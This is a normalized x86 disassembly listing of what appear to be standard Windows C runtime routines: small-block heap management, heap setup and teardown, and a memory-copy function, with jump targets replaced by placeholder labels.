mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe r-xdata
sub_1000c57f
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov edx edi
lea esi [ eax + 0x17 ]
sub edx [ ecx + 0xc ]
mov eax [ ecx + 0x10 ]
and esi 0xfffffff0
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
dec ecx
cmp esi ecx
mov [ ebp + 0x10 ] ecx
mov ebx [ ecx + edi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
push 0x1
pop eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
mov [ ebp + 0xc ] ebx
sar esi 0x4
dec esi
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] ecx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov ecx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov edx 0x80000000
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx esi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
mov edx 0x80000000
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx edi
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
shr edx cl
or [ eax ] edx
sub_1000c875
cmp [ rw-data ] 0xffffffff
push ebx
push ebp
push esi
push edi
jne r-xdata
push 0x2020
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
mov esi rw-data
jmp r-xdata
xor eax eax
mov ebp [ VirtualAlloc@IAT ]
push 0x4
push 0x2000
push 0x400000
push 0x0
call ebp
mov edi eax
test edi edi
je r-xdata
cmp esi rw-data
je r-xdata
push 0x4
mov ebx 0x10000
push 0x1000
push ebx
push edi
call ebp
test eax eax
je r-xdata
push esi
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
push 0x8000
push 0x0
push edi
call [ VirtualFree@IAT ]
mov eax rw-data
cmp esi eax
jne r-xdata
mov [ esi ] eax
mov eax [ rw-data ]
mov [ esi + 0x4 ] eax
mov [ rw-data ] esi
mov eax [ esi + 0x4 ]
mov [ eax ] esi
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
cmp ebp 0x10
setge dl
dec edx
and edx ecx
dec edx
inc ebp
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
add eax 0x8
cmp ebp 0x400
jl r-xdata
push ebx
push 0x0
push edi
call sub_1000fd50
add esp 0xc
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov eax esi
jmp r-xdata
or [ edi + 0xf8 ] 0xff
lea eax [ edi + 0x8 ]
mov [ edi ] eax
mov [ edi + 0x4 ] 0xf0
add edi 0x1000
jmp r-xdata
lea eax [ edi + 0x400000 ]
lea ecx [ esi + 0x98 ]
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x18 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] edi
mov [ esi + 0x8 ] eax
xor ebp ebp
mov ecx 0xf1
mov [ rw-data ] eax
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x10 ]
add eax ebx
cmp edi eax
jae r-xdata
sub_1000c9b9
push esi
mov esi [ esp + 0x8 ]
push 0x8000
push 0x0
push [ esi + 0x10 ]
call [ VirtualFree@IAT ]
cmp [ rw-data ] esi
jne r-xdata
cmp esi rw-data
je r-xdata
mov eax [ esi + 0x4 ]
mov [ rw-data ] eax
or [ rw-data ] 0xffffffff
pop esi
retn
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push esi
push 0x0
mov [ eax ] ecx
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
push [ rw-data ]
call [ HeapFree@IAT ]
pop esi
retn
sub_1000ca0f
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
cmp esi [ rw-data ]
je r-xdata
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x2010 ]
mov ebx 0x3ff000
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
sub ebx 0x1000
sub edi 0x8
test ebx ebx
jge r-xdata
mov eax ebx
push 0x4000
add eax [ esi + 0x10 ]
push 0x1000
push eax
call [ VirtualFree@IAT ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0xffffffff
je r-xdata
cmp [ edi ] 0xf0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
mov ecx esi
mov esi [ esi + 0x4 ]
je r-xdata
or [ edi ] 0xffffffff
dec [ rw-data ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ecx + 0x18 ] 0xffffffff
jne r-xdata
mov [ esi + 0xc ] edi
cmp eax edi
jbe r-xdata
push 0x1
lea eax [ ecx + 0x20 ]
pop edx
inc [ ebp - 0x4 ]
dec [ ebp + 0x8 ]
je r-xdata
cmp edx 0x400
jne r-xdata
inc edx
add eax 0x8
cmp edx 0x400
jl r-xdata
push ecx
call sub_1000c9b9
pop ecx
cmp [ eax ] 0xffffffff
jne r-xdata
sub_1000cad1
mov eax [ esp + 0x4 ]
mov edx rw-data
push esi
mov ecx edx
mov ecx [ ecx ]
cmp ecx edx
je r-xdata
cmp eax [ ecx + 0x14 ]
jb r-xdata
xor eax eax
pop esi
retn
jmp r-xdata
test al 0xf
jne r-xdata
cmp eax [ ecx + 0x10 ]
jbe r-xdata
mov esi eax
mov edx 0x100
and esi 0xfff
cmp esi edx
jb r-xdata
mov esi [ esp + 0xc ]
mov [ esi ] ecx
mov esi [ esp + 0x10 ]
mov ecx eax
and cx 0xf000
sub eax ecx
mov [ esi ] ecx
sub eax edx
pop esi
sar eax 0x4
lea eax [ eax + ecx + 0x8 ]
retn
sub_1000cb28
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
sub ecx [ eax + 0x10 ]
sar ecx 0xc
lea eax [ eax + ecx * 8 + 0x18 ]
mov ecx [ esp + 0xc ]
movzx edx [ ecx ]
add [ eax ] edx
and [ ecx ] 0x0
cmp [ eax ] 0xf0
mov [ eax + 0x4 ] 0xf1
jne r-xdata
retn
inc [ rw-data ]
cmp [ rw-data ] 0x20
jne r-xdata
push 0x10
call sub_1000ca0f
pop ecx
sub_1000cb6d
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
mov ebx [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
lea ecx [ esi + 0x2018 ]
mov eax edi
sub eax esi
sub eax 0x18
sar eax 0x3
shl eax 0xc
add eax edx
cmp edi ecx
mov [ ebp - 0x4 ] eax
jae r-xdata
mov eax rw-data
mov edi eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ edi ]
mov ebx [ ebp + 0x8 ]
cmp ecx ebx
jl r-xdata
mov edi [ edi ]
cmp edi eax
je r-xdata
cmp [ edi + 0xc ] 0x0
jne r-xdata
mov edx [ esi + 0x10 ]
cmp edx 0xffffffff
je r-xdata
mov esi [ esi ]
cmp esi [ rw-data ]
je r-xdata
mov eax [ edi ]
cmp eax ebx
jl r-xdata
add edi 0x8
lea ecx [ esi + 0x2018 ]
add eax 0x1000
cmp edi ecx
mov [ ebp - 0x4 ] eax
jb r-xdata
cmp [ edi + 0x4 ] ebx
jbe r-xdata
call sub_1000c875
test eax eax
je r-xdata
jmp r-xdata
mov ebx [ edi + 0xc ]
and [ ebp - 0x4 ] 0x0
mov esi ebx
mov eax ebx
sub esi edi
sub esi 0x18
sar esi 0x3
shl esi 0xc
add esi [ edi + 0x10 ]
cmp [ ebx ] 0xffffffff
jne r-xdata
add [ ebp - 0x4 ] 0x1000
add edi 0x8
cmp edi [ ebp - 0x8 ]
jb r-xdata
cmp [ edi + 0x4 ] ebx
jbe r-xdata
jmp r-xdata
push ebx
push ecx
push eax
call sub_1000cd75
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
mov ecx [ eax + 0x10 ]
mov [ ecx + 0x8 ] bl
lea edx [ ecx + ebx + 0x8 ]
mov [ rw-data ] eax
mov [ ecx ] edx
mov edx 0xf0
sub edx ebx
mov [ ecx + 0x4 ] edx
movzx edx bl
sub [ eax + 0x18 ] edx
lea eax [ ecx + 0x100 ]
jmp r-xdata
cmp [ edi + 0x10 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
push 0x4
shl eax 0xc
push 0x1000
push eax
push esi
mov [ ebp - 0x8 ] eax
call [ VirtualAlloc@IAT ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] 0x10
jge r-xdata
jmp r-xdata
push ebx
push eax
push [ ebp - 0x4 ]
call sub_1000cd75
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x10 ]
lea edi [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
cmp edi eax
mov [ ebp - 0x4 ] ecx
jae r-xdata
mov [ rw-data ] esi
sub [ edi ] ebx
mov [ esi + 0x8 ] edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi + 0x4 ] ebx
pop edi
pop esi
pop ebx
leave
retn
push 0x0
push [ ebp - 0x8 ]
push esi
call sub_1000fd50
mov edx [ ebp - 0x4 ]
add esp 0xc
test edx edx
mov ecx ebx
jle r-xdata
add eax 0x8
inc [ ebp - 0x4 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov [ edi + 0x4 ] ebx
mov [ rw-data ] edi
lea eax [ edi + 0x2018 ]
lea eax [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
sbb eax eax
and eax ecx
mov [ edi + 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] al
mov [ edi + 0x8 ] ebx
sub [ ebx ] eax
sub [ esi + 0x4 ] eax
lea ecx [ esi + eax + 0x8 ]
lea eax [ esi + 0x100 ]
mov [ esi ] ecx
jmp r-xdata
cmp [ ecx ] 0xffffffff
je r-xdata
or [ eax + 0xf4 ] 0xff
lea edx [ eax + 0x4 ]
mov [ eax - 0x4 ] edx
mov edx 0xf0
mov [ eax ] edx
mov [ ecx ] edx
mov [ ecx + 0x4 ] 0xf1
add eax 0x1000
add ecx 0x8
dec [ ebp - 0x4 ]
jne r-xdata
cmp ecx eax
add ecx 0x8
jmp r-xdata
cmp ecx eax
jae r-xdata
sub_1000cd75
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ecx + 0x4 ]
push edi
mov edi [ ecx ]
lea ebx [ ecx + 0xf8 ]
cmp esi edx
mov [ ebp - 0x4 ] edi
mov eax edi
mov [ ebp + 0x8 ] ebx
jb r-xdata
add esi edi
cmp [ esi ] 0x0
je r-xdata
lea eax [ edi + edx ]
mov [ edi ] dl
cmp eax ebx
jae r-xdata
lea esi [ eax + edx ]
cmp esi ebx
jae r-xdata
mov eax esi
and [ ecx + 0x4 ] 0x0
lea eax [ ecx + 0x8 ]
mov [ ecx ] eax
add [ ecx ] edx
sub [ ecx + 0x4 ] edx
jmp r-xdata
lea esi [ ecx + 0x8 ]
mov bl [ eax ]
test bl bl
jne r-xdata
imul ecx ecx 0xf
shl eax 0x4
sub eax ecx
jmp r-xdata
lea eax [ edi + 0x8 ]
jmp r-xdata
xor eax eax
lea eax [ esi + edx ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
movzx esi bl
add eax esi
push 0x1
lea ebx [ eax + 0x1 ]
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov al [ esi ]
test al al
jne r-xdata
cmp esi edx
jae r-xdata
inc ebx
inc esi
jmp r-xdata
movzx eax al
add esi eax
jmp r-xdata
push 0x1
lea ebx [ esi + 0x1 ]
pop eax
lea ebx [ eax + edx ]
cmp ebx [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x4 ]
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
cmp esi edi
jae r-xdata
cmp eax edx
jae r-xdata
inc ebx
inc eax
jmp r-xdata
and [ ecx + 0x4 ] 0x0
lea esi [ ecx + 0x8 ]
mov [ ecx ] esi
sub esi edx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] esi
jmp r-xdata
sub [ ebp + 0xc ] esi
cmp [ ebp + 0xc ] edx
jb r-xdata
mov [ ecx + 0x4 ] esi
jmp r-xdata
lea ebx [ esi + edx ]
cmp ebx [ ebp + 0x8 ]
jae r-xdata
sub [ ebp + 0xc ] eax
cmp [ ebp + 0xc ] edx
jb r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov [ eax ] dl
add eax 0x8
jmp r-xdata
mov edi [ ebp - 0x4 ]
mov eax ebx
jmp r-xdata
and [ ecx + 0x4 ] 0x0
lea eax [ ecx + 0x8 ]
mov [ ecx ] eax
sub eax edx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov esi ebx
jmp r-xdata
lea esi [ eax + edx ]
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov [ esi ] dl
lea eax [ esi + 0x8 ]
sub_1000ce99
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
movzx ecx [ edx ]
push edi
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax ebx
sub eax [ edi + 0x10 ]
sar eax 0xc
cmp ecx [ ebp + 0x14 ]
lea edi [ edi + eax * 8 + 0x18 ]
jbe r-xdata
jae r-xdata
mov eax [ ebp + 0x14 ]
sub ecx eax
mov [ edx ] al
add [ edi ] ecx
mov [ edi + 0x4 ] 0xf1
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
lea esi [ edx + eax ]
lea eax [ ebx + 0xf8 ]
cmp esi eax
ja r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ ecx + edx ]
jne r-xdata
cmp [ eax ] 0x0
jne r-xdata
mov al [ ebp + 0x14 ]
mov [ edx ] al
mov eax [ ebx ]
cmp edx eax
ja r-xdata
cmp eax esi
inc eax
jmp r-xdata
sub ecx [ ebp + 0x14 ]
add [ edi ] ecx
cmp esi eax
jbe r-xdata
cmp eax esi
jae r-xdata
lea eax [ ebx + 0xf8 ]
cmp esi eax
jae r-xdata
and [ ebx + 0x4 ] 0x0
lea eax [ ebx + 0x8 ]
mov [ ebx ] eax
xor eax eax
mov [ ebx ] esi
cmp [ esi ] al
jne r-xdata
mov [ ebx + 0x4 ] eax
jmp r-xdata
inc eax
cmp [ esi + eax ] 0x0
je r-xdata
sub_1000cf42
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
retn
sub_1000cf5d
push esi
mov esi [ esp + 0x8 ]
push 0x0
and [ esi ] 0x0
call [ GetModuleHandleA@IAT ]
cmp [ eax ] 0x5a4d
jne r-xdata
pop esi
retn
mov ecx [ eax + 0x3c ]
test ecx ecx
je r-xdata
add eax ecx
mov cl [ eax + 0x1a ]
mov [ esi ] cl
mov al [ eax + 0x1b ]
mov [ esi + 0x1 ] al
sub_1000cf8a
push ebp
mov ebp esp
mov eax 0x122c
call sub_1000a610
lea eax [ ebp - 0x98 ]
push ebx
push eax
mov [ ebp - 0x98 ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x122c ]
push 0x1090
push eax
push r--data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x88 ] 0x2
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_1000cf5d
cmp [ ebp - 0x4 ] 0x6
pop ecx
sbb eax eax
add eax 0x3
xor ebx ebx
lea ecx [ ebp - 0x122c ]
cmp [ ebp - 0x122c ] bl
je r-xdata
cmp [ ebp - 0x94 ] 0x5
jb r-xdata
lea eax [ ebp - 0x122c ]
push 0x16
push eax
push r--data
call sub_10009d90
add esp 0xc
test eax eax
jne r-xdata
mov al [ ecx ]
cmp al 0x61
jl r-xdata
push 0x1
pop eax
jmp r-xdata
lea eax [ ebp - 0x19c ]
push 0x104
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
cmp [ ebp - 0x19c ] bl
lea ecx [ ebp - 0x19c ]
je r-xdata
lea eax [ ebp - 0x122c ]
jmp r-xdata
inc ecx
cmp [ ecx ] bl
jne r-xdata
cmp al 0x7a
jg r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x19c ]
push eax
lea eax [ ebp - 0x122c ]
push eax
call sub_10009f60
pop ecx
pop ecx
mov al [ ecx ]
cmp al 0x61
jl r-xdata
cmp eax ebx
je r-xdata
sub al 0x20
mov [ ecx ] al
push 0x2c
push eax
call sub_10009040
pop ecx
cmp eax ebx
pop ecx
je r-xdata
inc ecx
cmp [ ecx ] bl
jne r-xdata
cmp al 0x7a
jg r-xdata
inc eax
mov ecx eax
cmp [ eax ] bl
je r-xdata
sub al 0x20
mov [ ecx ] al
push 0xa
push ebx
push eax
call sub_10009b65
add esp 0xc
cmp eax 0x2
je r-xdata
cmp [ ecx ] 0x3b
jne r-xdata
cmp eax 0x3
je r-xdata
inc ecx
mov [ ecx ] bl
jmp r-xdata
cmp eax 0x1
je r-xdata
cmp [ ecx ] bl
jne r-xdata
sub_1000d0d2
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
call sub_1000cf8a
cmp eax 0x3
mov [ rw-data ] eax
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x3f8
call sub_1000bd2e
pop ecx
jmp r-xdata
push 0x1
pop eax
retn
call sub_1000c875
test eax eax
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
sub_1000d12f
mov eax [ rw-data ]
push esi
cmp eax 0x3
push edi
jne r-xdata
cmp eax 0x2
jne r-xdata
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push ebp
mov ebp [ HeapFree@IAT ]
jle r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
pop edi
pop esi
retn
mov edi rw-data
mov esi edi
push [ rw-data ]
push 0x0
push [ rw-data ]
call ebp
pop ebp
pop ebx
jmp r-xdata
mov eax [ rw-data ]
mov edi [ VirtualFree@IAT ]
lea esi [ eax + 0xc ]
mov esi [ esi ]
cmp esi edi
jne r-xdata
push 0x8000
push 0x0
push eax
call [ VirtualFree@IAT ]
push 0x4000
push 0x100000
push [ esi ]
call edi
push 0x8000
push 0x0
push [ esi ]
call edi
push [ esi + 0x4 ]
push 0x0
push [ rw-data ]
call ebp
add esi 0x14
inc ebx
cmp ebx [ rw-data ]
jl r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
sub_1000d1e0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_1000d240 ]
jmp [ ecx * 4 + jump_table_1000d2bc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000d328 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1000d328 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_1000d4c0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_1000d3c8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000d4c0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000d328 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000d328 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000d328 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
